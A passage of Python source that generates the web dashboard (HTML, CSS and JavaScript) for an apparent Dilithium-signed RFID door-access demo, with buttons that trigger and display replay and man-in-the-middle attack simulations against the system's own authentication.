            "type": attack_type.replace("_attack", ""),
            "step": step_data["step"],
            "title": step_data["title"],
            "details": step_data["details"],
            "technical_details": step_data["technical_details"],
            "progress": (step_data["step"] / 6) * 100 if attack_type == "replay_attack" else (step_data["step"] / 5) * 100,
            "timestamp": int(time.time()),
            "real_attack": True,
            "threat_level": "CRITICAL" if step_data["step"] >= 3 else "HIGH",
            "waiting_for_card": getattr(self, 'mitm_waiting_for_card', False) if attack_type == "mitm_attack" else False
        })

    # ===========================================
    # WEB INTERFACE CREATION
    # ===========================================
    def create_web_files(self):
        """Create enhanced web interface files"""
        self.create_html_template()
        self.create_css_styles()
        self.create_javascript()
        self.create_user_images()
    
    def simulate_replay_attack(self):
        """Wrapper để gọi real replay attack"""
        return self.simulate_real_replay_attack()
    
    def simulate_mitm_attack(self):
        """Wrapper để gọi real MITM attack"""
        print("🎭 simulate_mitm_attack() called - redirecting to real implementation")
        return self.simulate_real_mitm_attack()

    def create_html_template(self):
        """Create main HTML template"""
        html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 Dilithium RFID Security Dashboard</title>
    <link rel="stylesheet" href="/static/styles.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="dashboard">
        <!-- Header -->
        <header class="header">
            <div class="header-content">
                <h1><i class="fas fa-shield-alt"></i> Dilithium RFID Security System</h1>
                <div class="status-indicators">
                    <div class="indicator" id="mqtt-status">
                        <i class="fas fa-wifi"></i> MQTT: <span>Connected</span>
                    </div>
                    <div class="indicator" id="security-status">
                        <i class="fas fa-lock"></i> Security: <span>Active</span>
                    </div>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Left Panel: Door Animation -->
            <div class="left-panel">
                <div class="door-container">
                    <div class="door-frame">
                        <div class="door" id="door">
                            <div class="door-handle"></div>
                            <div class="door-window"></div>
                        </div>
                        <div class="door-left" id="door-left"></div>
                        <div class="door-right" id="door-right"></div>
                    </div>
                    
                    <!-- RFID Reader -->
                    <div class="rfid-reader" id="rfid-reader">
                        <div class="rfid-light" id="rfid-light"></div>
                        <i class="fas fa-credit-card"></i>
                        <span>Tap Card Here</span>
                    </div>
                    
                    <!-- Door Status -->
                    <div class="door-status" id="door-status">
                        <i class="fas fa-door-closed"></i>
                        <span>Door Closed</span>
                    </div>
                </div>

                <!-- User Info Panel -->
                <div class="user-panel" id="user-panel">
                    <div class="user-info" id="user-info" style="display: none;">
                        <img id="user-avatar" src="/static/images/default_user.png" alt="User">
                        <div class="user-details">
                            <h3 id="user-name">Unknown User</h3>
                            <p id="user-uid">UID: ------</p>
                            <div class="user-permissions" id="user-permissions"></div>
                            <div class="access-time" id="access-time"></div>
                        </div>
                    </div>
                    
                    <div class="access-denied" id="access-denied" style="display: none;">
                        <i class="fas fa-times-circle"></i>
                        <h3>Access Denied</h3>
                        <p id="denied-reason">Invalid credentials</p>
                        <p id="denied-uid">UID: ------</p>
                    </div>
                </div>
            </div>

            <!-- Right Panel: Logs and Controls -->
            <div class="right-panel">
                <!-- Attack Simulation Controls -->
                <div class="attack-controls">
                    <h3><i class="fas fa-bug"></i> Security Testing</h3>
                    <div class="attack-buttons">
                        <button class="attack-btn" id="replay-attack-btn" onclick="startReplayAttack()">
                            <i class="fas fa-redo"></i> Replay Attack
                        </button>
                        <button class="attack-btn" id="mitm-attack-btn" onclick="startMITMAttack()">
                            <i class="fas fa-user-secret"></i> MITM Attack
                        </button>
                        <button class="stop-btn" id="stop-attack-btn" onclick="stopAttack()" style="display: none;">
                            <i class="fas fa-stop"></i> Stop Attack
                        </button>
                    </div>
                </div>

                <!-- Attack Log Window -->
                <div class="attack-window" id="attack-window" style="display: none;">
                    <div class="attack-header">
                        <h4 id="attack-title">Attack Simulation</h4>
                        <button class="close-btn" onclick="closeAttackWindow()">×</button>
                    </div>
                    <div class="attack-content" id="attack-content">
                        <div class="attack-progress">
                            <div class="progress-bar" id="attack-progress"></div>
                        </div>
                        <div class="attack-logs" id="attack-logs"></div>
                    </div>
                </div>

                <!-- System Logs -->
                <div class="logs-container">
                    <div class="logs-header">
                        <h3><i class="fas fa-list"></i> System Communication</h3>
                        <button class="clear-btn" onclick="clearLogs()">
                            <i class="fas fa-trash"></i> Clear
                        </button>
                    </div>
                    <div class="logs-content" id="logs-content">
                        <div class="log-entry system-start">
                            <span class="timestamp">--:--:--</span>
                            <span class="direction">SYSTEM</span>
                            <span class="type">INFO</span>
                            <span class="message">Dashboard started - waiting for RFID events...</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Attack Overlay -->
    <div class="attack-overlay" id="attack-overlay" style="display: none;">
        <div class="attack-modal">
            <div class="attack-modal-header">
                <h3 id="attack-modal-title">Attack in Progress</h3>
            </div>
            <div class="attack-modal-content">
                <div class="attack-visualization" id="attack-visualization">
                    <!-- Attack animation will be inserted here -->
                </div>
                <div class="attack-details" id="attack-details">
                    <!-- Attack details will be inserted here -->
                </div>
            </div>
        </div>
    </div>

    <script src="/static/dashboard.js"></script>
</body>
</html>'''
        
        with open(os.path.join(self.templates_dir, "index.html"), 'w', encoding='utf-8') as f:
            f.write(html_content)

# ...existing code...

    def create_css_styles(self):
        """Create CSS styles"""
        css_content = '''/* Reset and Base Styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    color: #333;
}

.dashboard {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

/* Header */
.header {
    background: rgba(255, 255, 255, 0.95);
    backdrop-filter: blur(10px);
    border-bottom: 1px solid rgba(255, 255, 255, 0.2);
    padding: 1rem 2rem;
    box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
}

.header-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    max-width: 1200px;
    margin: 0 auto;
}

.header h1 {
    color: #4a5568;
    font-size: 1.5rem;
    font-weight: 600;
}

.status-indicators {
    display: flex;
    gap: 1rem;
}

.indicator {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    padding: 0.5rem 1rem;
    background: rgba(72, 187, 120, 0.1);
    border: 1px solid rgba(72, 187, 120, 0.3);
    border-radius: 20px;
    color: #38a169;
    font-size: 0.9rem;
}

/* Main Content */
.main-content {
    flex: 1;
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 2rem;
    padding: 2rem;
    max-width: 1200px;
    margin: 0 auto;
    width: 100%;
}

/* Left Panel - Door Animation */
.left-panel {
    display: flex;
    flex-direction: column;
    gap: 2rem;
}

.door-container {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    padding: 3rem;
    text-align: center;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(10px);
    position: relative;
    overflow: hidden;
}

.door-frame {
    position: relative;
    width: 200px;
    height: 300px;
    margin: 0 auto 2rem;
    background: #8b4513;
    border-radius: 10px;
    border: 8px solid #654321;
    overflow: hidden;
}

.door {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, #d2b48c, #daa520);
    transition: transform 1s ease-in-out;
    z-index: 3;
    border-radius: 5px;
}

.door-left, .door-right {
    position: absolute;
    top: 0;
    width: 50%;
    height: 100%;
    background: linear-gradient(135deg, #d2b48c, #daa520);
    transition: transform 1s ease-in-out;
    display: none;
}

.door-left {
    left: 0;
    transform-origin: left center;
    border-radius: 5px 0 0 5px;
}

.door-right {
    right: 0;
    transform-origin: right center;
    border-radius: 0 5px 5px 0;
}

.door-handle {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    width: 15px;
    height: 15px;
    background: #ffd700;
    border-radius: 50%;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
}

.door-window {
    position: absolute;
    top: 30px;
    left: 50%;
    transform: translateX(-50%);
    width: 60px;
    height: 80px;
    background: rgba(135, 206, 235, 0.7);
    border-radius: 5px;
    border: 2px solid #4169e1;
}

/* Door Animation States */
.door.open {
    transform: rotateY(-120deg);
    transform-origin: left center;
}

.door.denied {
    animation: shake 0.5s ease-in-out;
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
}

/* RFID Reader */
.rfid-reader {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.5rem;
    padding: 1rem;
    background: rgba(0, 0, 0, 0.1);
    border-radius: 15px;
    border: 2px dashed #ccc;
    transition: all 0.3s ease;
    cursor: pointer;
}

.rfid-reader:hover {
    border-color: #667eea;
    background: rgba(102, 126, 234, 0.1);
}

.rfid-light {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #dc3545;
    transition: background-color 0.3s ease;
}

.rfid-light.active {
    background: #28a745;
    box-shadow: 0 0 10px #28a745;
}

.rfid-reader i {
    font-size: 2rem;
    color: #6c757d;
    transition: color 0.3s ease;
}

.rfid-reader.active i {
    color: #667eea;
}

/* Door Status */
.door-status {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding: 1rem;
    background: rgba(108, 117, 125, 0.1);
    border-radius: 10px;
    color: #6c757d;
    font-weight: 500;
}

.door-status.open {
    background: rgba(40, 167, 69, 0.1);
    color: #28a745;
}

.door-status.denied {
    background: rgba(220, 53, 69, 0.1);
    color: #dc3545;
}

/* User Panel */
.user-panel {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    padding: 2rem;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(10px);
}

.user-info {
    text-align: center;
}

.user-info img {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 4px solid #28a745;
    margin-bottom: 1rem;
    object-fit: cover;
}

.user-details h3 {
    color: #2d3748;
    margin-bottom: 0.5rem;
}

.user-details p {
    color: #718096;
    margin-bottom: 1rem;
}

.user-permissions {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    justify-content: center;
    margin-bottom: 1rem;
}

.permission-tag {
    padding: 0.25rem 0.75rem;
    background: rgba(102, 126, 234, 0.1);
    color: #667eea;
    border-radius: 20px;
    font-size: 0.8rem;
    border: 1px solid rgba(102, 126, 234, 0.3);
}

.access-time {
    font-size: 0.9rem;
    color: #a0aec0;
}

.access-denied {
    text-align: center;
    color: #dc3545;
}

.access-denied i {
    font-size: 4rem;
    margin-bottom: 1rem;
    opacity: 0.7;
}

/* Right Panel */
.right-panel {
    display: flex;
    flex-direction: column;
    gap: 2rem;
}

/* Attack Controls */
.attack-controls {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    padding: 2rem;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(10px);
}

.attack-controls h3 {
    color: #4a5568;
    margin-bottom: 1.5rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.attack-buttons {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.attack-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding: 1rem 1.5rem;
    background: linear-gradient(135deg, #ff6b6b, #ee5a24);
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
}

.attack-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
}

.attack-btn:disabled {
    background: #6c757d;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
}

.stop-btn {
    background: linear-gradient(135deg, #dc3545, #c82333);
    padding: 1rem 1.5rem;
    color: white;
    border: none;
    border-radius: 10px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
}

.stop-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(220, 53, 69, 0.4);
}

/* Attack Window */
.attack-window {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(10px);
    overflow: hidden;
}

.attack-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1.5rem 2rem;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
}

.attack-header h4 {
    margin: 0;
    font-size: 1.2rem;
}

.close-btn {
    background: none;
    border: none;
    color: white;
    font-size: 1.5rem;
    cursor: pointer;
    padding: 0;
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    transition: background-color 0.3s ease;
}

.close-btn:hover {
    background: rgba(255, 255, 255, 0.2);
}

.attack-content {
    padding: 2rem;
}

.attack-progress {
    margin-bottom: 1.5rem;
}

.progress-bar {
    width: 100%;
    height: 8px;
    background: rgba(102, 126, 234, 0.2);
    border-radius: 4px;
    overflow: hidden;
    position: relative;
}

.progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    background: linear-gradient(90deg, #667eea, #764ba2);
    border-radius: 4px;
    transition: width 0.5s ease;
    width: var(--progress, 0%);
}

.attack-logs {
    max-height: 300px;
    overflow-y: auto;
    border: 1px solid rgba(0, 0, 0, 0.1);
    border-radius: 10px;
    padding: 1rem;
    background: rgba(248, 249, 250, 0.5);
}

.attack-log-entry {
    margin-bottom: 1rem;
    padding: 1rem;
    background: white;
    border-radius: 8px;
    border-left: 4px solid #667eea;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.attack-log-entry h5 {
    color: #2d3748;
    margin-bottom: 0.5rem;
    font-size: 1rem;
}

.attack-log-entry ul {
    list-style: none;
    padding: 0;
}

.attack-log-entry li {
    color: #4a5568;
    margin-bottom: 0.25rem;
    font-size: 0.9rem;
}

/* Logs Container */
.logs-container {
    background: rgba(255, 255, 255, 0.95);
    border-radius: 20px;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(10px);
    overflow: hidden;
    flex: 1;
}

.logs-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1.5rem 2rem;
    background: rgba(102, 126, 234, 0.1);
    border-bottom: 1px solid rgba(102, 126, 234, 0.2);
}

.logs-header h3 {
    color: #4a5568;
    margin: 0;
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.clear-btn {
    background: rgba(220, 53, 69, 0.1);
    color: #dc3545;
    border: 1px solid rgba(220, 53, 69, 0.3);
    padding: 0.5rem 1rem;
    border-radius: 8px;
    cursor: pointer;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 0.9rem;
}

.clear-btn:hover {
    background: rgba(220, 53, 69, 0.2);
}

.logs-content {
    padding: 1rem;
    max-height: 400px;
    overflow-y: auto;
}

.log-entry {
    display: grid;
    grid-template-columns: 70px 120px 80px 1fr;
    gap: 0.5rem;
    padding: 0.75rem;
    margin-bottom: 0.5rem;
    background: rgba(248, 249, 250, 0.8);
    border-radius: 8px;
    font-size: 0.85rem;
    border-left: 3px solid #dee2e6;
    transition: all 0.3s ease;
    align-items: center;
}

.log-entry:hover {
    background: rgba(102, 126, 234, 0.1);
    border-left-color: #667eea;
}

.log-entry.system-start {
    border-left-color: #28a745;
    background: rgba(40, 167, 69, 0.1);
}

.log-entry .timestamp {
    color: #6c757d;
    font-weight: 600;
    font-size: 0.8rem;
}

.log-entry .direction {
    color: #495057;
    font-weight: 500;
    font-size: 0.8rem;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.log-entry .type {
    color: #667eea;
    font-weight: 600;
    text-transform: uppercase;
    font-size: 0.75rem;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.log-entry .message {
    color: #2d3748;
    font-size: 0.8rem;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    cursor: help;
}

/* Responsive Design */
@media (max-width: 768px) {
    .main-content {
        grid-template-columns: 1fr;
        padding: 1rem;
    }
    
    .header-content {
        flex-direction: column;
        gap: 1rem;
        text-align: center;
    }
    
    .status-indicators {
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .door-container {
        padding: 2rem 1rem;
    }
    
    .attack-buttons {
        flex-direction: column;
    }
    
    .log-entry {
        grid-template-columns: 1fr;
        gap: 0.25rem;
        text-align: left;
    }
    
    .log-entry .timestamp,
    .log-entry .direction,
    .log-entry .type,
    .log-entry .message {
        white-space: normal;
        word-break: break-word;
    }
}

/* Animations */
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.rfid-reader.detecting {
    animation: pulse 1s infinite;
}

@keyframes glow {
    0%, 100% { box-shadow: 0 0 5px rgba(102, 126, 234, 0.5); }
    50% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.8); }
}

.rfid-reader.active {
    animation: glow 2s infinite;
}

/* Scrollbar Styling */
.logs-content::-webkit-scrollbar,
.attack-logs::-webkit-scrollbar {
    width: 6px;
}

.logs-content::-webkit-scrollbar-track,
.attack-logs::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.1);
    border-radius: 3px;
}

.logs-content::-webkit-scrollbar-thumb,
.attack-logs::-webkit-scrollbar-thumb {
    background: rgba(102, 126, 234, 0.5);
    border-radius: 3px;
}

.logs-content::-webkit-scrollbar-thumb:hover,
.attack-logs::-webkit-scrollbar-thumb:hover {
    background: rgba(102, 126, 234, 0.7);
}'''
        
        with open(os.path.join(self.static_dir, "styles.css"), 'w', encoding='utf-8') as f:
            f.write(css_content)
        
        print("✅ CSS styles created")


    def create_javascript(self):
        """Create JavaScript for dashboard interactivity"""
        js_content = '''// Dashboard JavaScript
let socket = io();
let attackInProgress = false;
let currentAttackType = null;

// Socket event listeners
socket.on('connect', function() {
    console.log('Connected to server');
    updateConnectionStatus(true);
});

socket.on('disconnect', function() {
    console.log('Disconnected from server');
    updateConnectionStatus(false);
});

socket.on('mqtt_message', function(data) {
    addLogEntry(data);
});

socket.on('door_animation', function(data) {
    animateDoor(data.state);
});

socket.on('door_state', function(data) {
    updateDoorStatus(data.state, data.message);
});

socket.on('auth_success', function(userData) {
    showUserInfo(userData);
    animateDoor('open');
});

socket.on('auth_denied', function(data) {
    showAccessDenied(data);
    animateDoor('denied');
});

socket.on('attack_step', function(data) {
    updateAttackProgress(data);
    addAttackLog(data);
});

socket.on('attack_complete', function(data) {
    completeAttack(data);
});

socket.on('rfid_activity', function(data) {
    updateRFIDActivity(data);
});

// Helper function to truncate long messages
function truncateMessage(text, maxLength = 100) {
    if (typeof text !== 'string') {
        text = JSON.stringify(text);
    }
    
    if (text.length <= maxLength) {
        return text;
    }
    
    return text.substring(0, maxLength) + '...';
}

// Helper function to format JSON data for display
function formatLogData(data) {
    try {
        if (typeof data === 'object') {
            // Extract key information for display
            const keyInfo = [];
            
            if (data.type) keyInfo.push(`type: ${data.type}`);
            if (data.session_id) keyInfo.push(`session: ${data.session_id.substring(0, 8)}...`);
            if (data.card_uid) keyInfo.push(`uid: ${data.card_uid}`);
            if (data.user_name) keyInfo.push(`user: ${data.user_name}`);
            if (data.status) keyInfo.push(`status: ${data.status}`);
            if (data.algorithm) keyInfo.push(`algo: ${data.algorithm}`);
            
            if (keyInfo.length > 0) {
                return keyInfo.join(', ');
            }
            
            // Fallback to truncated JSON
            return truncateMessage(JSON.stringify(data), 80);
        }
        
        return truncateMessage(data.toString(), 80);
    } catch (e) {
        return 'Invalid data format';
    }
}

// Connection status
function updateConnectionStatus(connected) {
    const mqttStatus = document.getElementById('mqtt-status');
    const span = mqttStatus.querySelector('span');
    
    if (connected) {
        span.textContent = 'Connected';
        mqttStatus.style.background = 'rgba(72, 187, 120, 0.1)';
        mqttStatus.style.borderColor = 'rgba(72, 187, 120, 0.3)';
        mqttStatus.style.color = '#38a169';
    } else {
        span.textContent = 'Disconnected';
        mqttStatus.style.background = 'rgba(220, 53, 69, 0.1)';
        mqttStatus.style.borderColor = 'rgba(220, 53, 69, 0.3)';
        mqttStatus.style.color = '#dc3545';
    }
}

// Door animations
function animateDoor(state) {
    const door = document.getElementById('door');
    const doorStatus = document.getElementById('door-status');
    const rfidReader = document.getElementById('rfid-reader');
    const rfidLight = document.getElementById('rfid-light');
    
    // Remove all animation classes
    door.classList.remove('open', 'denied', 'detecting');
    doorStatus.classList.remove('open', 'denied');
    rfidReader.classList.remove('active', 'detecting');
    rfidLight.classList.remove('active');
    
    switch(state) {
        case 'detecting':
            rfidReader.classList.add('detecting');
            rfidLight.classList.add('active');
            break;
        case 'authenticating':
            rfidReader.classList.add('active');
            rfidLight.classList.add('active');
            break;
        case 'open':
            door.classList.add('open');
            doorStatus.classList.add('open');
            break;
        case 'denied':
            door.classList.add('denied');
            doorStatus.classList.add('denied');
            break;
        case 'closed':
            // Default state
            break;
    }
}

function updateDoorStatus(state, message) {
    const doorStatus = document.getElementById('door-status');
    const icon = doorStatus.querySelector('i');
    const span = doorStatus.querySelector('span');
    
    switch(state) {
        case 'detecting':
            icon.className = 'fas fa-search';
            span.textContent = message || 'Detecting Card...';
            break;
        case 'authenticating':
            icon.className = 'fas fa-key';
            span.textContent = message || 'Authenticating...';
            break;
        case 'open':
            icon.className = 'fas fa-door-open';
            span.textContent = 'Door Open';
            break;
        case 'denied':
            icon.className = 'fas fa-times-circle';
            span.textContent = 'Access Denied';
            break;
        default:
            icon.className = 'fas fa-door-closed';
            span.textContent = 'Door Closed';
    }
}

// User information display
function showUserInfo(userData) {
    const userInfo = document.getElementById('user-info');
    const accessDenied = document.getElementById('access-denied');
    
    // Hide access denied, show user info
    accessDenied.style.display = 'none';
    userInfo.style.display = 'block';
    
    // Update user details
    document.getElementById('user-avatar').src = userData.image;
    document.getElementById('user-name').textContent = userData.name;
    document.getElementById('user-uid').textContent = `UID: ${userData.uid}`;
    document.getElementById('access-time').textContent = `Access granted at ${userData.timestamp}`;
    
    // Update permissions
    const permissionsContainer = document.getElementById('user-permissions');
    permissionsContainer.innerHTML = '';
    userData.permissions.forEach(permission => {
        const tag = document.createElement('span');
        tag.className = 'permission-tag';
        tag.textContent = permission;
        permissionsContainer.appendChild(tag);
    });
    
    // Auto-hide after 8 seconds
    setTimeout(() => {
        userInfo.style.display = 'none';
    }, 8000);
}

function showAccessDenied(data) {
    const userInfo = document.getElementById('user-info');
    const accessDenied = document.getElementById('access-denied');
    
    // Hide user info, show access denied
    userInfo.style.display = 'none';
    accessDenied.style.display = 'block';
    
    // Update denied details
    document.getElementById('denied-reason').textContent = data.reason;
    document.getElementById('denied-uid').textContent = `UID: ${data.uid}`;
    
    // Auto-hide after 5 seconds
    setTimeout(() => {
        accessDenied.style.display = 'none';
    }, 5000);
}

// RFID activity updates
function updateRFIDActivity(data) {
    const rfidLight = document.getElementById('rfid-light');
    const rfidReader = document.getElementById('rfid-reader');
    
    switch(data.type) {
        case 'card_detected':
            rfidLight.classList.add('active');
            rfidReader.classList.add('detecting');
            break;
        case 'card_removed':
            rfidLight.classList.remove('active');
            rfidReader.classList.remove('detecting', 'active');
            break;
    }
}

// Attack functions
function startReplayAttack() {
    if (attackInProgress) return;
    
    attackInProgress = true;
    currentAttackType = 'replay';
    
    // Update UI
    document.getElementById('replay-attack-btn').disabled = true;
    document.getElementById('mitm-attack-btn').disabled = true;
    document.getElementById('stop-attack-btn').style.display = 'block';
    
    // Show attack window
    showAttackWindow('Replay Attack Simulation');
    
    // Start attack
    fetch('/start_attack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({type: 'replay'})
    });
}

function startMITMAttack() {
    if (attackInProgress) return;
    
    attackInProgress = true;
    currentAttackType = 'mitm';
    
    // Update UI
    document.getElementById('replay-attack-btn').disabled = true;
    document.getElementById('mitm-attack-btn').disabled = true;
    document.getElementById('stop-attack-btn').style.display = 'block';
    
    // Show attack window
    showAttackWindow('MITM Attack Simulation');
    
    // Start attack
    fetch('/start_attack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({type: 'mitm'})
    });
}

function stopAttack() {
    if (!attackInProgress) return;
    
    fetch('/stop_attack', {
        method: 'POST'
    });
    
    resetAttackUI();
}

function resetAttackUI() {
    attackInProgress = false;
    currentAttackType = null;
    
    // Reset buttons
    document.getElementById('replay-attack-btn').disabled = false;
    document.getElementById('mitm-attack-btn').disabled = false;
    document.getElementById('stop-attack-btn').style.display = 'none';
    
    // Hide attack window
    closeAttackWindow();
}

function showAttackWindow(title) {
    const attackWindow = document.getElementById('attack-window');
    const attackTitle = document.getElementById('attack-title');
    const attackLogs = document.getElementById('attack-logs');
    
    attackTitle.textContent = title;
    attackLogs.innerHTML = '';
    attackWindow.style.display = 'block';
    
    // Reset progress
    updateProgressBar(0);
}

function closeAttackWindow() {
    document.getElementById('attack-window').style.display = 'none';
}

function updateAttackProgress(data) {
    updateProgressBar(data.progress);
    
    // Update attack logs if waiting for card
    if (data.waiting_for_card) {
        const attackLogs = document.getElementById('attack-logs');
        const waitingMessage = document.createElement('div');
        waitingMessage.className = 'attack-log-entry';
        waitingMessage.innerHTML = `
            <h5>🚨 MITM Listener Active - Waiting for Card Scan</h5>
            <ul>
                <li>📱 Please scan your RFID card now to trigger MITM injection</li>
                <li>⚡ Attack will automatically execute when card is detected</li>
                <li>🛡️ Mutual authentication will block the attack</li>
            </ul>
        `;
        attackLogs.appendChild(waitingMessage);
        attackLogs.scrollTop = attackLogs.scrollHeight;
    }
}

function addAttackLog(data) {
    const attackLogs = document.getElementById('attack-logs');
    const logEntry = document.createElement('div');
    logEntry.className = 'attack-log-entry';
    
    logEntry.innerHTML = `
        <h5>${data.title}</h5>
        <ul>
            ${data.details.map(detail => `<li>${detail}</li>`).join('')}
        </ul>
    `;
    
    attackLogs.appendChild(logEntry);
    attackLogs.scrollTop = attackLogs.scrollHeight;
}

function updateProgressBar(progress) {
    const progressBar = document.getElementById('attack-progress');
    progressBar.style.setProperty('--progress', progress + '%');
}

function completeAttack(data) {
    setTimeout(() => {
        resetAttackUI();
        
        // Show completion message
        alert(`Attack Complete!\\n\\nType: ${data.type.toUpperCase()}\\nSuccess: ${data.success}\\nBlocked by: ${data.blocked_by}`);
    }, 2000);
}

// Enhanced Log management with truncation
function addLogEntry(data) {
    const logsContent = document.getElementById('logs-content');
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    
    // Create log entry elements
    const timestamp = document.createElement('span');
    timestamp.className = 'timestamp';
    timestamp.textContent = data.timestamp;
    
    const direction = document.createElement('span');
    direction.className = 'direction';
    direction.textContent = truncateMessage(data.direction, 15);
    
    const type = document.createElement('span');
    type.className = 'type';
    type.textContent = data.type;
    
    const message = document.createElement('span');
    message.className = 'message';
    message.textContent = formatLogData(data.data);
    message.title = JSON.stringify(data.data, null, 2); // Show full data on hover
    
    // Append elements
    logEntry.appendChild(timestamp);
    logEntry.appendChild(direction);
    logEntry.appendChild(type);
    logEntry.appendChild(message);
    
    // Add to logs
    logsContent.appendChild(logEntry);
    
    // Auto-scroll to bottom
    logsContent.scrollTop = logsContent.scrollHeight;
    
    // Limit log entries
    const logEntries = logsContent.querySelectorAll('.log-entry');
    if (logEntries.length > 100) {
        logEntries[0].remove();
    }
}

function clearLogs() {
    const logsContent = document.getElementById('logs-content');
    const systemStart = logsContent.querySelector('.system-start');
    
    // Clear all except system start message
    logsContent.innerHTML = '';
    if (systemStart) {
        logsContent.appendChild(systemStart);
    }
}

// Initialize dashboard
document.addEventListener('DOMContentLoaded', function() {
    console.log('Dashboard initialized');
    
    // Set initial timestamp for system start message
    const systemStart = document.querySelector('.system-start .timestamp');
    if (systemStart) {
        systemStart.textContent = new Date().toLocaleTimeString();
    }
});'''
        
        with open(os.path.join(self.static_dir, "dashboard.js"), 'w', encoding='utf-8') as f:
            f.write(js_content)

    def create_user_images(self):
        """Create placeholder user images"""
        try:
            # Try to import PIL, if not available create simple text files
            from PIL import Image, ImageDraw, ImageFont
            
            users = [
                {"name": "user1.jpg", "color": "#3498db", "text": "USER 1"},
                {"name": "user2.JPG", "color": "#e74c3c", "text": "USER 2"}, 
                {"name": "admin.png", "color": "#f39c12", "text": "ADMIN"},
                {"name": "guest.png", "color": "#95a5a6", "text": "GUEST"},
                {"name": "default_user.png", "color": "#9b59b6", "text": "DEFAULT"}
            ]
            
            for user in users:
                # Create 200x200 image
                img = Image.new('RGB', (200, 200), user["color"])
                draw = ImageDraw.Draw(img)
                
                # Try to use a font, fall back to default if not available
                try:
                    font = ImageFont.truetype("arial.ttf", 24)
                except:
                    font = ImageFont.load_default()
                
                # Calculate text position (center)
                bbox = draw.textbbox((0, 0), user["text"], font=font)
                text_width = bbox[2] - bbox[0]
                text_height = bbox[3] - bbox[1]
                
                position = ((200 - text_width) // 2, (200 - text_height) // 2)
                
                # Draw text
                draw.text(position, user["text"], fill="white", font=font)
                
                # Save image
                img_path = os.path.join(self.static_dir, "images", user["name"])
                img.save(img_path)
            
            print("✅ User placeholder images created with PIL")
            
        except ImportError:
            # PIL not available, create simple SVG placeholders
            print("⚠️ PIL not available, creating SVG placeholders...")
            
            users = [
                {"name": "user1.jpg", "color": "#3498db", "text": "USER 1"},
